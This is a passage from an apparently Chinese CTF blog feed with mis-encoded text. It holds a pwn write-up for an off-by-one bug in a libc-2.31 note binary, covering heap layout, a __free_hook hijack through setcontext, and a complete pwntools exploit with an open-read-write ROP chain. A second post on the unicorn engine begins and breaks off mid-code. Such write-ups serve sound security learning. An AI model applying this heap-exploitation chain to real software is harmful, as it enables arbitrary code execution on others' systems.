class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input note index.&quot;</span>);</span><br><span class="line">  v1 = input();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= size0x20 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;hacker ! out !&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> write(<span class="number">1</span>, heap_ptr[v1], heap_size[v1]);<span class="comment">//æ‰“å°å †å†…æ•°æ®</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="4"><li>delete</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input note index.&quot;</span>);</span><br><span class="line">  v1 = input();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= size0x20 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;hacker ! out !&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(heap_ptr[v1]);</span><br><span class="line">  heap_ptr[v1] = <span class="number">0LL</span>;<span class="comment">//é‡Šæ”¾å †å—ï¼Œå¹¶å°†æŒ‡é’ˆç½®é›¶</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="åŸºæœ¬æ¼æ´"><a href="#åŸºæœ¬æ¼æ´" class="headerlink" title="åŸºæœ¬æ¼æ´"></a>åŸºæœ¬æ¼æ´</h3><p><code>off-by-one</code>æ¼æ´å­˜åœ¨äº<code>edit</code>åŠŸèƒ½ä¸­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= heap_size[v2]; ++i )<span class="comment">//off-by-one</span></span><br><span class="line">  &#123;</span><br><span class="line">    read(<span class="number">0</span>, (heap_ptr[v2] + i), <span class="number">1uLL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( *(heap_ptr[v2] + i) == <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      result = (heap_ptr[v2] + i);</span><br><span class="line">      *result = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h3 id="åˆ©ç”¨æ€è·¯ï¼š"><a href="#åˆ©ç”¨æ€è·¯ï¼š" class="headerlink" title="åˆ©ç”¨æ€è·¯ï¼š"></a>åˆ©ç”¨æ€è·¯ï¼š</h3><ol><li>å¡«æ»¡<code>tcache bin</code>ä¸­<code>0xc0</code>å¤§å°çš„å †å—ï¼Œä½¿å¾—ä¸‹ä¸€å—<code>0xc0</code>å¤§å°çš„å †å—è¢«é‡Šæ”¾åä¼šè¿›å…¥<code>unsortedbin</code></li><li>ç”³è¯·6ä¸ª<code>0x31</code>å¤§å°çš„å †å—ï¼ˆç¬¬6ä¸ªå †å—ç”¨äºé˜²æ­¢unsortedbinå¤§å°å †å—çš„åˆå¹¶ï¼‰</li><li>ç”¨ç¬¬1ä¸ªå †å—ä¿®æ”¹ç¬¬äºŒä¸ªå †å—çš„<code>size</code>ä½ä¸º<code>0xc1</code>ï¼Œå†å°†ç¬¬2ä¸ªå †å—é‡Šæ”¾æ‰ï¼Œè¯¥å †å—ä¾¿èƒ½è¿›å…¥<code>unsortedbin</code></li><li>åˆ‡å‰²<code>unsortedbin</code>æ³„éœ²å‡º<code>libc</code>åŸºå€ï¼Œå¹¶é€ æˆå †å—é‡å </li><li>åˆ©ç”¨å †å—é‡å ï¼Œæˆ‘ä»¬é€šè¿‡ä¿®æ”¹<code>fd</code>å¯ä»¥ç”³è¯·ä¿®æ”¹<code>__free_hook</code>ä¸ºè·³æ¿<code>gadget</code>ï¼š</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000001518B0                 mov     rdx, [rdi+8]</span><br><span class="line">.text:00000000001518B4                 mov     [rsp+0C8h+var_C8], rax</span><br><span class="line">.text:00000000001518B8                 call    qword ptr [rdx+20h]</span><br></pre></td></tr></table></figure><ol start="6"><li>ç”³è¯·å›ä¸¤ä¸ª<code>0xb0</code>å¤§å°çš„å †å—ï¼Œå¯¹é‡Šæ”¾çš„å †å—æ„é€ å¦‚ä¸‹ï¼š</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">0x55fb03c8db90:0x00000000000000000x00000000000000c1</span><br><span class="line">0x55fb03c8dba0:0x00007f0b8b87ab720x000055fb03c8dd50/* ORW_ROPé“¾</span><br><span class="line">0x55fb03c8dbb0:0x00007f0b8b87d04f0x0000000000000000</span><br><span class="line">0x55fb03c8dbc0:0x00007f0b8b89e4000x0000000000000002</span><br><span class="line">0x55fb03c8dbd0:0x00007f0b8b9650000x00007f0b8b87ab72</span><br><span class="line">0x55fb03c8dbe0:0x00000000000000030x00007f0b8b87d04f</span><br><span class="line">0x55fb03c8dbf0:0x000055fb03c8dd500x00007f0b8b970241</span><br><span class="line">0x55fb03c8dc00:0x00000000000000200x0000000000000000</span><br><span class="line">0x55fb03c8dc10:0x00007f0b8b964ff00x00007f0b8b87ab72</span><br><span class="line">0x55fb03c8dc20:0x00000000000000010x00007f0b8b965090</span><br><span class="line">0x55fb03c8dc30:0x00000000000000000x0000000000000000</span><br><span class="line">0x55fb03c8dc40:0x00000000000000000x0000000000000000</span><br><span class="line"></span><br><span class="line">0x55fb03c8dc50:0x00000000000000000x00000000000000c1/* éœ€è¦é‡Šæ”¾çš„å †å—</span><br><span class="line">0x55fb03c8dc60:0x000055fb03c8dc600x000055fb03c8dc60/* mov rdx, [rdi+8]</span><br><span class="line">0x55fb03c8dc70:0x61616161616161610x6161616161616161</span><br><span class="line">0x55fb03c8dc80:0x00007f0b8b8abf8d0x6161616161616161/* call qword ptr [rdx+20h]</span><br><span class="line">0x55fb03c8dc90:0x61616161616161610x6161616161616161&lt;=&gt; call &lt;setcontext+53&gt;</span><br><span class="line">0x55fb03c8dca0:0x61616161616161610x6161616161616161</span><br><span class="line">0x55fb03c8dcb0:0x61616161616161610x6161616161616161</span><br><span class="line">0x55fb03c8dcc0:0x61616161616161610x6161616161616161</span><br><span class="line">0x55fb03c8dcd0:0x61616161616161610x6161616161616161</span><br><span class="line">0x55fb03c8dce0:0x61616161616161610x6161616161616161</span><br><span class="line">0x55fb03c8dcf0:0x61616161616161610x6161616161616161</span><br><span class="line">0x55fb03c8dd00:0x000055fb03c8dba00x00007f0b8b879679</span><br><span class="line">/* mov rsp, QWORD PTR [rdx+0xa0] &lt;=&gt; mov rsp, [ORW_ROPé“¾]</span><br><span class="line">/* mov rcx, [rdx+0A8h] &lt;=&gt; mov rcx, [ret]</span><br><span class="line">/* push rcx</span><br><span class="line">/* ret &lt;=&gt; ret [rcx]</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&quot;./orz&quot;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choose which one?\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;please input note size : &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    io.sendafter(<span class="string">&quot;please input your note.\n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choose which one?\n&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;please input note index.\n&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    io.sendafter(<span class="string">&quot;please input new note.\n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choose which one?\n&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;please input note index.\n&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choose which one?\n&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;please input note index.\n&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="comment"># fill up 0xc1 tcache</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        add(<span class="number">0xb0</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        free(i)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># off-by-one to leak libc_base </span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        add(<span class="number">0x28</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#0-5</span></span><br><span class="line">    edit(<span class="number">0</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x28</span>+<span class="string">&#x27;\xc1&#x27;</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">0x28</span>,<span class="string">&#x27;flag\x00&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">    show(<span class="number">2</span>)</span><br><span class="line">    libc_base=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">96</span>-<span class="number">0x10</span>-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    log.success(<span class="string">&quot;libc_base====&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">    free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># overlapping to leak heap_base</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        add(<span class="number">0x28</span>,<span class="string">&#x27;cccc&#x27;</span>)<span class="comment">#6-8 &lt;==&gt;2-4</span></span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    show(<span class="number">7</span>)</span><br><span class="line">    heap_base=u64(io.recv(<span class="number">8</span>))&amp;<span class="number">0xfffffffff000</span>-<span class="number">0x2000</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># hijack __free_hook</span></span><br><span class="line">    edit(<span class="number">7</span>,p64(free_hook)+<span class="string">b&#x27;\x0a&#x27;</span>)</span><br><span class="line">    log.success(<span class="string">&quot;heap_base====&gt;&quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line">    magic=libc_base+<span class="number">0x1518B0</span></span><br><span class="line">    add(<span class="number">0x28</span>,<span class="string">&#x27;dddd&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">    add(<span class="number">0x28</span>,p64(magic))<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># gadgets</span></span><br><span class="line">    pop_rax_ret=libc_base+<span class="number">0x0000000000047400</span></span><br><span class="line">    pop_rdi_ret=libc_base+<span class="number">0x0000000000023b72</span></span><br><span class="line">    pop_rsi_ret=libc_base+<span class="number">0x000000000002604f</span></span><br><span class="line">    pop_rdx_r12_ret=libc_base+<span class="number">0x0000000000119241</span></span><br><span class="line">    ret=libc_base+<span class="number">0x0000000000022679</span></span><br><span class="line">    syscall=libc_base+<span class="number">0x0000000000010E000</span></span><br><span class="line"></span><br><span class="line">    flag_addr=heap_base+<span class="number">0xd50</span></span><br><span class="line">    <span class="comment">#open</span></span><br><span class="line">    orw_rop=p64(pop_rdi_ret)+p64(flag_addr)+p64(pop_rsi_ret)+p64(<span class="number">0</span>)</span><br><span class="line">    orw_rop+=p64(pop_rax_ret)+p64(<span class="number">2</span>)+p64(syscall)</span><br><span class="line">    <span class="comment">#read</span></span><br><span class="line">    orw_rop+=p64(pop_rdi_ret)+p64(<span class="number">3</span>)+p64(pop_rsi_ret)+p64(flag_addr)</span><br><span class="line">    orw_rop+=p64(pop_rdx_r12_ret)+p64(<span class="number">0x20</span>)+p64(<span class="number">0</span>)+p64(libc_base+libc.sym[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">    <span class="comment">#write</span></span><br><span class="line">    orw_rop+=p64(pop_rdi_ret)+p64(<span class="number">1</span>)+p64(libc_base+libc.sym[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line"></span><br><span class="line">    rop_addr=heap_base+<span class="number">0xba0</span></span><br><span class="line">    jmp_addr=heap_base+<span class="number">0xc60</span></span><br><span class="line">    setcontext=libc_base+<span class="number">0x54f8d</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># construct heap &amp; trigger __free_hook</span></span><br><span class="line">    add(<span class="number">0xb0</span>,p64(jmp_addr)*<span class="number">2</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(setcontext)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x78</span>+p64(rop_addr)+p64(ret))<span class="comment">#9</span></span><br><span class="line">    add(<span class="number">0xb0</span>,orw_rop)<span class="comment">#10</span></span><br><span class="line">    free(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line">    </span><br><span class="line">exp()</span><br></pre></td></tr></table></figure><h3 id="å…¶ä»–ï¼špatchelfåä¿®å¤gdbçš„debugç¬¦å·è¡¨"><a href="#å…¶ä»–ï¼špatchelfåä¿®å¤gdbçš„debugç¬¦å·è¡¨" class="headerlink" title="å…¶ä»–ï¼špatchelfåä¿®å¤gdbçš„debugç¬¦å·è¡¨"></a>å…¶ä»–ï¼špatchelfåä¿®å¤gdbçš„debugç¬¦å·è¡¨</h3><p><code>patchelf</code>ä¿®æ”¹äº†<code>libc</code>å’Œ<code>ld</code>ï¼Œè€Œ<code>gdb</code>è°ƒè¯•æ—¶ä¼šå»å¯»æ‰¾<code>libc</code>ç›®å½•ä¸‹çš„<code>.debug</code>æ–‡ä»¶ï¼Œæ‰€ä»¥æ— æ³•ä½¿ç”¨ä¸€äº›<code>heap/bins</code>ä¹‹ç±»çš„å‘½ä»¤ï¼Œå› æ­¤æˆ‘ä»¬å»<code>glibc-all-in-one</code>ä¸­ä¸‹è½½å¯¹åº”ç‰ˆæœ¬çš„<code>libc</code>åŠå…¶é™„å¸¦çš„<code>.debug</code>ã€‚</p><p>å®ç°æ“ä½œå¦‚ä¸‹ï¼š</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">cd /glibc-all-in-one/</span><br><span class="line"></span><br><span class="line">fuzz@fuzz-virtual-machine:/glibc-all-in-one$ sudo python3 update_list</span><br><span class="line">[+] <span class="keyword">Common</span> <span class="keyword">list</span> has been <span class="keyword">save</span> <span class="keyword">to</span> <span class="string">&quot;list&quot;</span></span><br><span class="line">[+] Old-release <span class="keyword">list</span> has been <span class="keyword">save</span> <span class="keyword">to</span> <span class="string">&quot;old_list&quot;</span></span><br><span class="line"></span><br><span class="line">fuzz@fuzz-virtual-machine:/glibc-all-in-one$ cat <span class="keyword">list</span></span><br><span class="line"><span class="number">2.23</span>-<span class="number">0</span>ubuntu11.<span class="number">3</span>_amd64</span><br><span class="line"><span class="number">2.23</span>-<span class="number">0</span>ubuntu11.<span class="number">3</span>_i386</span><br><span class="line"><span class="number">2.23</span>-<span class="number">0</span>ubuntu3_amd64</span><br><span class="line"><span class="number">2.23</span>-<span class="number">0</span>ubuntu3_i386</span><br><span class="line"><span class="number">2.27</span>-<span class="number">3</span>ubuntu1.<span class="number">5</span>_amd64</span><br><span class="line"><span class="number">2.27</span>-<span class="number">3</span>ubuntu1.<span class="number">5</span>_i386</span><br><span class="line"><span class="number">2.27</span>-<span class="number">3</span>ubuntu1.<span class="number">6</span>_amd64</span><br><span class="line"><span class="number">2.27</span>-<span class="number">3</span>ubuntu1.<span class="number">6</span>_i386</span><br><span class="line"><span class="number">2.27</span>-<span class="number">3</span>ubuntu1_amd64</span><br><span class="line"><span class="number">2.27</span>-<span class="number">3</span>ubuntu1_i386</span><br><span class="line"><span class="number">2.31</span>-<span class="number">0</span>ubuntu9.<span class="number">7</span>_amd64</span><br><span class="line"><span class="number">2.31</span>-<span class="number">0</span>ubuntu9.<span class="number">7</span>_i386</span><br><span class="line"><span class="number">2.31</span>-<span class="number">0</span>ubuntu9.<span class="number">9</span>_amd64</span><br><span class="line"><span class="number">2.31</span>-<span class="number">0</span>ubuntu9.<span class="number">9</span>_i386</span><br><span class="line"><span class="number">2.31</span>-<span class="number">0</span>ubuntu9_amd64</span><br><span class="line"><span class="number">2.31</span>-<span class="number">0</span>ubuntu9_i386</span><br><span class="line"><span class="number">2.35</span>-<span class="number">0</span>ubuntu3.<span class="number">1</span>_amd64</span><br><span class="line"><span class="number">2.35</span>-<span class="number">0</span>ubuntu3.<span class="number">1</span>_i386</span><br><span class="line"><span class="number">2.35</span>-<span class="number">0</span>ubuntu3_amd64</span><br><span class="line"><span class="number">2.35</span>-<span class="number">0</span>ubuntu3_i386</span><br><span class="line"><span class="number">2.36</span>-<span class="number">0</span>ubuntu1_amd64</span><br><span class="line"><span class="number">2.36</span>-<span class="number">0</span>ubuntu1_i386</span><br><span class="line"></span><br><span class="line">fuzz@fuzz-virtual-machine:/glibc-all-in-one$ sudo ./download <span class="number">2.31</span>-<span class="number">0</span>ubuntu9.<span class="number">7</span>_amd64</span><br><span class="line">fuzz@fuzz-virtual-machine:/glibc-all-in-one$ cd libs/</span><br><span class="line">fuzz@fuzz-virtual-machine:/glibc-all-in-one/libs$ ls</span><br><span class="line"><span class="number">2.31</span>-<span class="number">0</span>ubuntu9.<span class="number">7</span>_amd64</span><br><span class="line">fuzz@fuzz-virtual-machine:/glibc-all-in-one/libs$ cd <span class="number">2.31</span>-<span class="number">0</span>ubuntu9.<span class="number">7</span>_amd64</span><br></pre></td></tr></table></figure><p>åœ¨è¯¥ç›®å½•ä¸‹<code>ctrl+h</code>ä¾¿èƒ½æ˜¾ç¤ºå‡ºéšè—æ–‡ä»¶<code>.debug</code>ï¼Œå°†<code>.debug</code>å¤åˆ¶åˆ°é¢˜ç›®çš„ç›®å½•ä¸‹ï¼Œ<code>gdb</code>è°ƒè¯•å‘½ä»¤å°±æ¢å¤äº†ã€‚</p><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><blockquote><p><a href="https://verf1sh.github.io/2022/05/25/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B9%BF%E4%B8%9C%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/#midpwn">ç¬¬äºŒå±Šå¹¿ä¸œå¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨å¤§èµ›-by Verfish</a></p><p><a href="https://trick.ink/article/glibc-all-in-one/">Glibc-All-In-One</a></p><p><a href="https://bbs.pediy.com/thread-254868.htm">å…³äºä¸åŒç‰ˆæœ¬ glibc æ›´æ¢çš„ä¸€äº›é—®é¢˜</a></p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;èµ›å‰å¤ç›˜ä¸€é“&lt;code&gt;libc2.31&lt;/code&gt;çš„&lt;code&gt;off-by-one&lt;/code&gt;æ¼æ´åˆ©ç”¨çš„é¢˜ç›®ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="pwn" scheme="http://example.com/categories/pwn/"/>
    
    
    <category term="libc-2.31" scheme="http://example.com/tags/libc-2-31/"/>
    
  </entry>
  
  <entry>
    <title>unicorn</title>
    <link href="http://example.com/2022/06/24/unicorn/"/>
    <id>http://example.com/2022/06/24/unicorn/</id>
    <published>2022-06-24T02:46:31.000Z</published>
    <updated>2023-02-06T11:17:54.969Z</updated>
    
    <content type="html"><![CDATA[<p>ç»“åˆ ctfèµ›é¢˜ å­¦ä¹ ä¸€ä¸‹ unicorn å¼•æ“çš„åŸºç¡€ä½¿ç”¨ã€‚</p><p><a href="https://bbs.pediy.com/thread-224330.htm#msg_header_h3_1">å‚è€ƒæ–‡ç« </a></p><p><a href="https://github.com/kabeor/Unicorn-Engine-Documentation/blob/master/Unicorn-Engine%20Documentation.md">unicornä¸­æ–‡æ–‡æ¡£</a></p><span id="more"></span><h2 id="hxp-CTF-2017-Fibonacci"><a href="#hxp-CTF-2017-Fibonacci" class="headerlink" title="hxp CTF 2017 Fibonacci"></a>hxp CTF 2017 Fibonacci</h2><p>è¿è¡Œè¯¥äºŒè¿›åˆ¶ç¨‹åºæ—¶ï¼Œæˆ‘ä»¬å‘ç°æ‰“å°<code>flag</code>çš„é€Ÿåº¦è¶Šæ¥è¶Šæ…¢ï¼š</p><p><img src="https://m.360buyimg.com/babel/jfs/t1/177336/3/25517/8754/62b52868E53cee082/a11a2873758db905.png" alt="1656039526862.png"></p><p>å› æ­¤å¿…é¡»å¯¹è¯¥ç¨‹åºè¿›è¡Œä¼˜åŒ–ï¼Œåœ¨åˆç†æ—¶é—´å†…æ‰“å°å‡º<code>flag</code></p><p>åˆ©ç”¨<code>ida_pro</code>åç¼–è¯‘çœ‹ä¸€ä¸‹ç¨‹åºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// rbp</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// ebx</span></span><br><span class="line">  __int64 v5; <span class="comment">// r8</span></span><br><span class="line">  <span class="type">char</span> v6; <span class="comment">// r9</span></span><br><span class="line">  __int64 v7; <span class="comment">// r8</span></span><br><span class="line">  <span class="type">char</span> v8; <span class="comment">// cl</span></span><br><span class="line">  <span class="type">int</span> v10[<span class="number">7</span>]; <span class="comment">// [rsp+Ch] [rbp-1Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3 = &amp;unk_4007E1;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The flag is: &quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v5) = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v10[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">      FIB(v4 + v5, v10);<span class="comment">//è°ƒç”¨ FIB å‡½æ•°</span></span><br><span class="line">      v8 = v7;</span><br><span class="line">      v5 = v7 + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v5 != <span class="number">8</span> );</span><br><span class="line">    v4 += <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (v10[<span class="number">0</span>] 